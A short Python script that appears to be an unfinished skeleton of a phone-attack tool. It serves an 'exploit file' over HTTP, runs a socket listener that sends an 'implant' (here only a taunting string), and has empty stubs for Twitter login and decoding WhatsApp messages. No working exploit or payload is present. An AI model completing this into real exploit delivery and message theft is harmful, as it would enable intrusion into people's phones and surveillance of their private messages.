import http.server, socket, twitter

# uses port 12345, ensure later processes use a different port
# TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
def listen_for_phone_and_send_exploit_file(ip_address):
    server_address = (ip_address, 12345)
    print("Localhost waiting on port 12345 for client to connect")
    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    s.handle_request()

def send_implant(ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969               
    s.bind((ip_address, port))
    s.listen(1)        
    print("Listening on port 6969 of " + ip_address)         
    while True:
        conn, addr = s.accept()
        print('Got connection from: ', addr)
        payload = 'HaHahAHa gEt pWnEd LOLOLOL'
        conn.send(payload.encode())
        print("Payload sent to target")
        conn.close() 
    
def login_twitter():
    pass

def fetch_tweets():
    pass

def decode_whatsapp_messages():
    pass

if __name__ == "__main__":
    host = 'localhost'
    listen_for_phone_and_send_exploit_file(host)
    send_implant(host)